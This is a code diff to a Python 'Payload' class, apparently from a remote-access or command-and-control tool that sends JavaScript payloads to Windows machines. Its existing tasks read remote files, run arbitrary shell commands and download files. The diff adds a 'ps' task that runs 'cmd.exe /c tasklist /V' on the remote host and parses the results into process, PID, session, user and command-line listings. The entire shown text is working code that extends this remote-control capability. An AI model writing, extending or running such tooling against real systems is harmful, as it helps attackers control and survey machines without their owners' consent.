@@ -110,6 +110,9 @@ class Payload():
         # 显示远程文本文件
         elif payload_type == 'cat':
             js_vars['~REMOTE_PATHNAME~'] = kwargs['remote_pathname']
+        # 显示进程信息
+        elif payload_type == 'ps':
+            js_vars['~CMD~'] = 'cmd.exe /c tasklist /V'
         # 运行程序、执行shell命令
         elif payload_type == 'run' or payload_type == 'shell':
             js_vars['~CMD~'] = kwargs['cmd']
@@ -173,12 +176,40 @@ class Payload():
                     ex), log_type=Log.JOB_RES)
 
     '''
+    格式化输出系统进程信息
+    '''
+
+    def job_ps(self, response_text, args):
+        lines = response_text.split('\n')
+        lines.pop(0)
+        lines.pop(0)
+        columns = lines.pop(0).split(' ')
+        p = []
+        col_start = 0
+        for c in columns:
+            p.append({'start': col_start, 'end': col_start+len(c)})
+            col_start += len(c)+1
+
+        Log.log_message('{:<25} {:>8} {:<16} {:<40} {:<40}'.format('IMAGE',
+                                                                   'PID', 'SESSION', 'USER', 'CMDLINE'), log_type=Log.JOB_RES)
+        for line in lines:
+            image = line[p[0]['start']:p[0]['end']]
+            pid = line[p[1]['start']:p[1]['end']]
+            session = line[p[2]['start']:p[2]['end']]
+            user = line[p[6]['start']:p[6]['end']]
+            cmdline = line[p[8]['start']:p[8]['end']]
+            Log.log_message('{:<25} {:>8} {:<16} {:<40} {:<40}'.format(image.strip(), pid.strip(
+            ), session.strip(), user.strip(), cmdline.strip()), log_type=Log.JOB_RES)
+
+    '''
     对任务返回数据进行处理
     '''
 
     def payload_callback(self, response_text, job_type, args):
         if job_type == 'info':
             self.job_info(response_text)
+        elif job_type == 'ps':
+            self.job_ps(response_text, args)
         elif job_type == 'download':
             self.job_download(response_text, args)
         else:
